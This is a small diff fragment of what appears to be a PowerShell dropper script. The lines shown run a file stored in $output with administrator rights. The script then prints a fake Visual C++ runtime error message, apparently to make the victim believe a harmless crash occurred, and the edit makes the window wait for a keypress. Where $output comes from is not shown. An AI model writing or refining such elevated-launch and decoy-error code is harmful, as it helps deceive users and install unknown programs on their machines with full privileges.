@@ -21,4 +21,5 @@ Start-Process -FilePath $output -Verb RunAs
 
 Start-Sleep -s 5
 echo 'Visual C++ runtime has malfunctioned: R6035 R6028'
-Start-Sleep
+[void][System.Console]::ReadKey($true)
+
